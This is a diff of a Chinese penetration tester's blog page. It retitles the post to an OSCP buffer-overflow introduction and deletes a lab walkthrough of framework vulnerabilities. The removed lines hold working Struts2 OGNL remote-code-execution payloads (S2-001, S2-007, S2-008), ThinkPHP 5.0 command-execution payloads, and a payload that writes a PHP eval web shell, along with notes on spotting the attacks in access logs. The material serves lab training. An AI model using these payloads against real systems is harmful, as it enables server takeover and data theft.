@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>常见框架漏洞 | Falao&#39;s Blog</title>
+  <title>OSCP-缓冲区溢出简介 | Falao&#39;s Blog</title>
   <meta name="keywords" content="">
-  <meta name="description" content="常见框架漏洞 | Falao&#39;s Blog">
+  <meta name="description" content="OSCP-缓冲区溢出简介 | Falao&#39;s Blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="ID：法老职业：渗透测试工程师证书：OSCP&#x2F;CISP-PTE">
 <meta property="og:type" content="website">
@@ -627,9 +627,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-常见框架漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-OSCP-缓冲区溢出简介" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">常见框架漏洞</h1>
+        <h1 class="article-title">OSCP-缓冲区溢出简介</h1>
     
     <div class="article-meta">
         
@@ -639,7 +639,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="WEB渗透">WEB渗透</a>
+            <a  data-rel="计算机认证">计算机认证</a>
             
         </span>
         
@@ -647,7 +647,7 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2021-02-25 18:04:40'>2021-02-24 09:48</time>
+            Created At : <time class="date" title='Updated At: 2021-03-01 21:14:11'>2021-03-01 20:59</time>
         
     </div>
     <div class="article-meta">
@@ -669,7 +669,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%EF%BC%9AStruts2%E6%A1%86%E6%9E%B6"><span class="toc-text">一：Struts2框架</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-s2-001%E5%A4%8D%E7%8E%B0"><span class="toc-text">1:s2-001复现</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%EF%BC%9A%E5%90%AF%E5%8A%A8%E9%9D%B6%E6%9C%BA%E7%8E%AF%E5%A2%83"><span class="toc-text">步骤一：启动靶机环境</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%EF%BC%9ABP%E6%8A%93%E5%8C%85%E7%AF%A1%E6%94%B9%E6%95%B0%E6%8D%AE"><span class="toc-text">步骤二：BP抓包篡改数据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%EF%BC%9A%E6%9F%A5%E7%9C%8B%E6%97%A5%E5%BF%97%E4%BF%A1%E6%81%AF"><span class="toc-text">步骤三：查看日志信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E5%9B%9B%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-text">步骤四：日志分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-S2-007%E5%A4%8D%E7%8E%B0"><span class="toc-text">2:S2-007复现</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%EF%BC%9A%E5%90%AF%E5%8A%A8%E9%9D%B6%E6%9C%BA%E7%8E%AF%E5%A2%83-1"><span class="toc-text">步骤一：启动靶机环境</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%EF%BC%9ABP%E6%8A%93%E5%8C%85%E7%AF%A1%E6%94%B9%E6%95%B0%E6%8D%AE-1"><span class="toc-text">步骤二：BP抓包篡改数据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-text">步骤三：日志分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-S2-008%E5%A4%8D%E7%8E%B0"><span class="toc-text">3:S2-008复现</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%EF%BC%9A%E5%90%AF%E5%8A%A8%E9%9D%B6%E6%9C%BA%E7%8E%AF%E5%A2%83-2"><span class="toc-text">步骤一：启动靶机环境</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%EF%BC%9A%E6%94%BB%E5%87%BB%E6%B5%8B%E8%AF%95"><span class="toc-text">步骤二：攻击测试</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-1"><span class="toc-text">步骤三：日志分析</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%EF%BC%9AThinkPHP%E6%A1%86%E6%9E%B6"><span class="toc-text">二：ThinkPHP框架</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%EF%BC%9AThinkPHP5-0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">1：ThinkPHP5.0漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%EF%BC%9A%E9%83%A8%E7%BD%B2%E7%8E%AF%E5%A2%83"><span class="toc-text">步骤一：部署环境</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">步骤二：漏洞利用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%EF%BC%9AGetShell"><span class="toc-text">步骤三：GetShell</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%EF%BC%9AX86%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E7%AE%80%E4%BB%8B"><span class="toc-text">一：X86体系结构简介</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%EF%BC%9A%E7%A8%8B%E5%BA%8F%E5%AD%98%E5%82%A8%E5%99%A8"><span class="toc-text">1：程序存储器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%EF%BC%9ACPU-%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-text">2：CPU 寄存器</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E6%93%8D"><span class="toc-text">二：缓冲区溢出实操</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%EF%BC%9A%E6%98%93%E5%8F%97%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81%E5%AE%9E%E4%BE%8B"><span class="toc-text">1：易受攻击代码实例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%EF%BC%9Aimmunity%E8%B0%83%E8%AF%95%E5%99%A8"><span class="toc-text">2：immunity调试器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%EF%BC%9A%E5%AF%BC%E8%88%AA%E4%BB%A3%E7%A0%81"><span class="toc-text">3：导航代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%EF%BC%9A%E6%BA%A2%E5%87%BA%E7%BC%93%E5%86%B2%E5%8C%BA"><span class="toc-text">4：溢出缓冲区</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%EF%BC%9AExercises"><span class="toc-text">5：Exercises</span></a></li></ol></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -685,250 +685,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="一：Struts2框架"><a href="#一：Struts2框架" class="headerlink" title="一：Struts2框架"></a>一：Struts2框架</h1><blockquote>
-<p>Struts2框架是一个用于开发Java EE网络应用程序的开放源代码网页应用程序架构，利用并延伸了Java Servlet API，鼓励开发者采用MVC架构。最初被称为 WebWork 2，是一个简洁的、可扩展的框架,用于创建企业级Java web应用程序。设计这个框架是为了从构建、部署、到应用程序维护方面来简化整个开发周期。</p>
-<p>Struts2漏洞是一个远程命令执行漏洞和开放重定向漏洞。利用漏洞,黑客可发起远程攻击,不但可以窃取网站数据信息,甚至还可取得网站服务器控制权。而且,目前针对此漏洞的自动化工具开始出现,攻击者无需具备与漏洞相关的专业知识即可侵入服务器,直接执行命令操作,盗取数据甚至进行毁灭性操作。</p>
-</blockquote>
-<h3 id="1-s2-001复现"><a href="#1-s2-001复现" class="headerlink" title="1:s2-001复现"></a>1:s2-001复现</h3><h5 id="步骤一：启动靶机环境"><a href="#步骤一：启动靶机环境" class="headerlink" title="步骤一：启动靶机环境"></a>步骤一：启动靶机环境</h5><pre><code class="shell">┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-001]
-└─# pwd   #进入靶机容器存放目录
-/home/laosec/vulhub/struts2/s2-001                                                                       
-┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-001]
-└─# ls    #查看目录下内容
-1.jpeg              Dockerfile  README.zh-cn.md
-docker-compose.yml  README.md   S2-001.war
-┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-001]
-└─# cat README.zh-cn.md    #查看中文说明文件           
-# S2-001 远程代码执行漏洞
-## 原理
-参考 [http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html](http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html)
-&gt; 该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行
-## 环境
-执行以下命令启动s2-001测试环境
-​```
-docker-compose build
-docker-compose up -d
-​```
-## POC &amp;&amp; EXP
-获取tomcat执行路径：
-​```
-%{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}
-​```
-获取Web路径：
-​```
-%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}
-​```
-执行任意命令（命令加参数：`new java.lang.String[]{"cat","/etc/passwd"}`）：
-​```
-%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"pwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
-​```   
-┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-001]
-└─# docker-compose up -d   #启动容器</code></pre>
-<h5 id="步骤二：BP抓包篡改数据"><a href="#步骤二：BP抓包篡改数据" class="headerlink" title="步骤二：BP抓包篡改数据"></a>步骤二：BP抓包篡改数据</h5><blockquote>
-<p>在登录界面任意输入用户名和密码，提交数据并使用BP拦截转发到repeater模块,从password字段进行修改</p>
-</blockquote>
-<pre><code class="java">%25%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22whoami%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D</code></pre>
-<p><img src="https://s3.ax1x.com/2021/02/24/yOVBP1.png"></p>
-<p><img src="https://s3.ax1x.com/2021/02/24/yOV5Gt.png"></p>
-<h5 id="步骤三：查看日志信息"><a href="#步骤三：查看日志信息" class="headerlink" title="步骤三：查看日志信息"></a>步骤三：查看日志信息</h5><blockquote>
-<ol>
-<li>查看容器,命令:<strong>docker ps</strong> （首先查看开启的容器/容器的ID）</li>
-<li>进入容器,找到日志文件,命令：docker exec -it f523bb254057 /bin/bash （进入容器：docker exec -it 容器ID /bin/bash ）</li>
-<li>打开日志,进入容器后ls查看目录，找到logs文件也就是日志存放的文件，ls查看目录，找到日志记录的txt文件</li>
-</ol>
-</blockquote>
-<pre><code class="shell">┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-001]
-└─# docker ps #查看开启的容器      
-CONTAINER ID   IMAGE            COMMAND             CREATED             STATUS             PORTS                    NAMES
-dbacf2ad73f8   s2-001_struts2   "catalina.sh run"   About an hour ago   Up About an hour   0.0.0.0:8080-&gt;8080/tcp   s2-001_struts2_1          
-┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-001]
-└─# docker exec -it dbacf2ad73f8 /bin/bash   #进入容器
-root@dbacf2ad73f8:/usr/local/tomcat# ls
-LICENSE  NOTICE  RELEASE-NOTES  RUNNING.txt  bin  conf  include  lib  logs  native-jni-lib  temp  webapps  work
-root@dbacf2ad73f8:/usr/local/tomcat# cd logs  #进入日志目录
-root@dbacf2ad73f8:/usr/local/tomcat/logs# ls
-catalina.2021-02-24.log  host-manager.2021-02-24.log  localhost.2021-02-24.log  localhost_access_log.2021-02-24.txt  manager.2021-02-24.log
-root@dbacf2ad73f8:/usr/local/tomcat/logs# cat localhost_access_log.2021-02-24.txt  #查看访问日志
-192.168.0.104 - - [24/Feb/2021:01:55:22 +0000] "GET / HTTP/1.1" 200 1085
-192.168.0.104 - - [24/Feb/2021:01:55:22 +0000] "GET /favicon.ico HTTP/1.1" 404 1081
-192.168.0.104 - - [24/Feb/2021:01:58:50 +0000] "GET / HTTP/1.1" 200 1085
-192.168.0.104 - - [24/Feb/2021:01:58:50 +0000] "GET /favicon.ico HTTP/1.1" 404 1081
-192.168.0.104 - - [24/Feb/2021:02:57:26 +0000] "POST /login.action;jsessionid=B057108D156CC0121C69D64768A8E60C HTTP/1.1" 200 50742
-192.168.0.104 - - [24/Feb/2021:03:04:58 +0000] "POST /login.action;jsessionid=B057108D156CC0121C69D64768A8E60C HTTP/1.1" 200 50742
-root@dbacf2ad73f8:/usr/local/tomcat/logs# exit  #退出容器</code></pre>
-<h5 id="步骤四：日志分析"><a href="#步骤四：日志分析" class="headerlink" title="步骤四：日志分析"></a>步骤四：日志分析</h5><blockquote>
-<p>根据日志显示字节长度,判断是否为恶意攻击等行为(正常请求不会超过一千)</p>
-</blockquote>
-<h3 id="2-S2-007复现"><a href="#2-S2-007复现" class="headerlink" title="2:S2-007复现"></a>2:S2-007复现</h3><h5 id="步骤一：启动靶机环境-1"><a href="#步骤一：启动靶机环境-1" class="headerlink" title="步骤一：启动靶机环境"></a>步骤一：启动靶机环境</h5><pre><code class="shell">┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-001]
-└─# docker stop dbacf2ad73f8              
-dbacf2ad73f8                                                             
-┌──(root💀kali)-[/home/laosec/vulhub/struts2]
-└─# cd ../s2-007                                                       
-┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-007]
-└─# ls                 
-1.jpeg              Dockerfile  README.zh-cn.md
-docker-compose.yml  README.md   S2-007.war
-┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-007]
-└─# cat README.zh-cn.md
-# S2-007 远程代码执行漏洞
-影响版本: 2.0.0 - 2.2.3
-漏洞详情: http://struts.apache.org/docs/s2-007.html
-## 测试环境搭建
-​```
-docker-compose build
-docker-compose up -d
-​```
-## 原理
-参考 http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html
-当配置了验证规则 `&lt;ActionName&gt;-validation.xml` 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。例如这里有一个 UserAction：
-​```java
-(...)
-public class UserAction extends ActionSupport {
-        private Integer age;
-        private String name;
-        private String email;
-(...)
-​```
-然后配置有 UserAction-validation.xml：
-​```xml
-&lt;?xml version="1.0" encoding="UTF-8" ?&gt;
-&lt;!DOCTYPE validators PUBLIC
-        "-//OpenSymphony Group//XWork Validator 1.0//EN"
-        "http://www.opensymphony.com/xwork/xwork-validator-1.0.2.dtd"&gt;
-&lt;validators&gt;
-        &lt;field name="age"&gt;
-                &lt;field-validator type="int"&gt;
-                        &lt;param name="min"&gt;1&lt;/param&gt;
-                        &lt;param name="max"&gt;150&lt;/param&gt;
-                &lt;/field-validator&gt;
-        &lt;/field&gt;
-&lt;/validators&gt;
-​```
-当用户提交 age 为字符串而非整形数值时，后端用代码拼接 `"'" + value + "'"` 然后对其进行 OGNL 表达式解析。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQLi 注入单引号拼接的方式即可注入任意 OGNL 表达式。
-因为受影响版本为 Struts2 2.0.0 - Struts2 2.2.3，所以这里给出绕过安全配置进行命令执行的 Payload（**弹计算器，无法在本项目环境下运行**）：
-​```
-' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@java.lang.Runtime@getRuntime().exec("open /Applications/Calculator.app")) + '
-​```
-## Exploit
-@rickgray 在原文中只给了弹计算器的POC，我给出执行任意代码的EXP：
-​```
-' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())) + '
-​```
-将Exp传入可以利用的输入框（age），得到命令执行结果
-┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-007]
-└─# docker-compose build                                                         
-┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-007]
-└─# docker-compose up -d
-Building with native build. Learn about native build in Compose here: https://docs.docker.com/go/compose-native-build/
-Creating network "s2-007_default" with the default driver
-Creating s2-007_struts2_1 ... done</code></pre>
-<h5 id="步骤二：BP抓包篡改数据-1"><a href="#步骤二：BP抓包篡改数据-1" class="headerlink" title="步骤二：BP抓包篡改数据"></a>步骤二：BP抓包篡改数据</h5><blockquote>
-<p>在登录界面任意输入用户名和密码与年龄，提交数据并使用BP拦截转发到repeater模块,从age字段进行修改</p>
-</blockquote>
-<pre><code class="java">=%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%29+%2B+%27</code></pre>
-<p><img src="https://s3.ax1x.com/2021/02/24/yOKsxI.png"></p>
-<h5 id="步骤三：日志分析"><a href="#步骤三：日志分析" class="headerlink" title="步骤三：日志分析"></a>步骤三：日志分析</h5><pre><code class="shell">┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-007]
-└─# docker ps           
-CONTAINER ID   IMAGE            COMMAND             CREATED         STATUS         PORTS                    NAMES
-64a403fa2148   s2-007_struts2   "catalina.sh run"   5 minutes ago   Up 5 minutes   0.0.0.0:8080-&gt;8080/tcp   s2-007_struts2_1                                                                 
-┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-007]
-└─# docker exec -it 64a403fa2148 /bin/bash
-root@64a403fa2148:/usr/local/tomcat# ls
-LICENSE  RELEASE-NOTES  bin   include  logs            temp     work
-NOTICE   RUNNING.txt    conf  lib      native-jni-lib  webapps
-root@64a403fa2148:/usr/local/tomcat# cd logs
-root@64a403fa2148:/usr/local/tomcat/logs# ls
-catalina.2021-02-24.log      localhost_access_log.2021-02-24.txt
-host-manager.2021-02-24.log  manager.2021-02-24.log
-localhost.2021-02-24.log
-root@64a403fa2148:/usr/local/tomcat/logs# cat localhost_access_log.2021-02-24.txt 
-192.168.0.104 - - [24/Feb/2021:03:28:50 +0000] "GET / HTTP/1.1" 200 1093 
-192.168.0.104 - - [24/Feb/2021:03:28:50 +0000] "GET /favicon.ico HTTP/1.1" 404 1081
-192.168.0.104 - - [24/Feb/2021:03:30:23 +0000] "POST /user.action HTTP/1.1" 200 288
-192.168.0.104 - - [24/Feb/2021:03:30:51 +0000] "POST /user.action HTTP/1.1" 200 1275
-#通过字节判断是否存在恶意攻击 正常请求不超过1000
-root@64a403fa2148:/usr/local/tomcat/logs# </code></pre>
-<h3 id="3-S2-008复现"><a href="#3-S2-008复现" class="headerlink" title="3:S2-008复现"></a>3:S2-008复现</h3><h5 id="步骤一：启动靶机环境-2"><a href="#步骤一：启动靶机环境-2" class="headerlink" title="步骤一：启动靶机环境"></a>步骤一：启动靶机环境</h5><pre><code class="shell">┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-007]
-└─# docker stop 64a403fa2148       
-64a403fa2148                                                                         
-┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-007]
-└─# cd ../s2-008                                                                              
-┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-008]
-└─# cat README.zh-cn.md
-# S2-008 远程代码执行漏洞
-影响版本: 2.1.0 - 2.3.1
-漏洞详情: http://struts.apache.org/docs/s2-008.html
-## 测试环境搭建
-​```
-docker-compose build
-docker-compose up -d
-​```
-## 原理
-参考 http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html
-&gt; S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的。
-例如在 devMode 模式下直接添加参数`?debug=command&amp;expression=&lt;OGNL EXP&gt;`，会直接执行后面的 OGNL 表达式，因此可以直接执行命令（注意转义）：
-​```
-http://localhost:8080/S2-008/devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29)
-​```   
-┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-008]
-└─# docker-compose build
-┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-008]
-└─# docker-compose up -d                                               1 ⨯
-Building with native build. Learn about native build in Compose here: https://docs.docker.com/go/compose-native-build/
-Creating network "s2-008_default" with the default driver
-Creating s2-008_struts2_1 ... done</code></pre>
-<h5 id="步骤二：攻击测试"><a href="#步骤二：攻击测试" class="headerlink" title="步骤二：攻击测试"></a>步骤二：攻击测试</h5><blockquote>
-<p>打开网页并开启hackbar,在hackbar下面加载url并添加payload,提交数据后便可以回显执行payload执行结果</p>
-</blockquote>
-<pre><code class="http">devmode.action?debug=command&amp;expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23a%3d@java.lang.Runtime@getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2c%23b%3dnew%20java.io.InputStreamReader%28%23a%29%2c%23c%3dnew%20java.io.BufferedReader%28%23b%29%2c%23d%3dnew%20char%5b50000%5d%2c%23c.read%28%23d%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%23d%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29</code></pre>
-<p><img src="https://s3.ax1x.com/2021/02/24/yOQFcn.png"></p>
-<h5 id="步骤三：日志分析-1"><a href="#步骤三：日志分析-1" class="headerlink" title="步骤三：日志分析"></a>步骤三：日志分析</h5><pre><code class="shell">┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-008]
-└─# docker ps                                                                                               
-CONTAINER ID   IMAGE            COMMAND             CREATED         STATUS         PORTS                    NAMES
-563187af17b3   s2-008_struts2   "catalina.sh run"   7 minutes ago   Up 7 minutes   0.0.0.0:8080-&gt;8080/tcp   s2-008_struts2_1
-┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-008]
-└─# docker exec -it 563187af17b3 /bin/bash
-root@563187af17b3:/usr/local/tomcat# cd logs
-root@563187af17b3:/usr/local/tomcat/logs# cat localhost_access_log.2021-02-24.txt 
-192.168.0.104 - - [24/Feb/2021:03:39:10 +0000] "GET / HTTP/1.1" 200 389
-192.168.0.104 - - [24/Feb/2021:03:40:56 +0000] "GET /devmode.action?
-192.168.0.104 - - [24/Feb/2021:03:42:04 +0000] "GET /devmode.action?debug=command&amp;expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23a%3d@java.lang.Runtime@getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2c%23b%3dnew%20java.io.InputStreamReader%28%23a%29%2c%23c%3dnew%20java.io.BufferedReader%28%23b%29%2c%23d%3dnew%20char%5b50000%5d%2c%23c.read%28%23d%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%23d%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29 HTTP/1.1" 200 50061
-root@563187af17b3:/usr/local/tomcat/logs# </code></pre>
-<h1 id="二：ThinkPHP框架"><a href="#二：ThinkPHP框架" class="headerlink" title="二：ThinkPHP框架"></a>二：ThinkPHP框架</h1><blockquote>
-<p>ThinkPHP是一款国内流行的开源PHP框架，某些版本可能存在远程代码执行漏洞，攻击者可向缓存文件内写入PHP代码，导致远程代码执行。虽然该漏洞利用需要有几个前提条件，但鉴于国内使用ThinkPHP框架的站点数量之多，该漏洞还是存在一定的影响范围.</p>
-</blockquote>
-<h3 id="1：ThinkPHP5-0漏洞复现"><a href="#1：ThinkPHP5-0漏洞复现" class="headerlink" title="1：ThinkPHP5.0漏洞复现"></a>1：ThinkPHP5.0漏洞复现</h3><blockquote>
-<p>受影响的版本包括<strong>5.0</strong>和<strong>5.1</strong></p>
-</blockquote>
-<h5 id="步骤一：部署环境"><a href="#步骤一：部署环境" class="headerlink" title="步骤一：部署环境"></a>步骤一：部署环境</h5><ul>
-<li><p>下载ThinkPHP5.0.22版本源码程序，放在PHPStudy运行目录下并访问</p>
-<pre><code class="http">链接：https://pan.baidu.com/s/1xV5j3JkG8UhYkgE4MMbPyg 
-提取码：lsec 
-复制这段内容后打开百度网盘手机App，操作更方便哦</code></pre>
-<p><img src="https://s3.ax1x.com/2021/02/25/yvDOIS.png"></p>
-</li>
-</ul>
-<h5 id="步骤二：漏洞利用"><a href="#步骤二：漏洞利用" class="headerlink" title="步骤二：漏洞利用"></a>步骤二：漏洞利用</h5><blockquote>
-<p>将Payload添加进入URL地址后面进行利用</p>
-</blockquote>
-<ul>
-<li><p>Payload1:system函数远程命令执行</p>
-<pre><code class="http">?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</code></pre>
-</li>
-<li><p>Payload2:phpinfo函数查看phpinfo()的信息</p>
-<pre><code class="http">Payload：?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</code></pre>
-</li>
-</ul>
-<h5 id="步骤三：GetShell"><a href="#步骤三：GetShell" class="headerlink" title="步骤三：GetShell"></a>步骤三：GetShell</h5><blockquote>
-<p>利用Payload写入shell,并使用菜刀进行连接</p>
-</blockquote>
-<ul>
-<li><p>Payload1:写入shell</p>
-<pre><code class="shell">?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo ^&lt;?php @eval($_POST[cmd]);?^&gt; &gt;shell.php</code></pre>
-<p>**注意:**需要对特殊字符使用^转义(cmd环境下转义方式),windows环境的echo命令输出字符串到文档不用引号(单引号、双引号),部分字符url编码不编码都行.</p>
-<p><img src="https://s3.ax1x.com/2021/02/25/yvrHSJ.png"></p>
-</li>
-</ul>
-
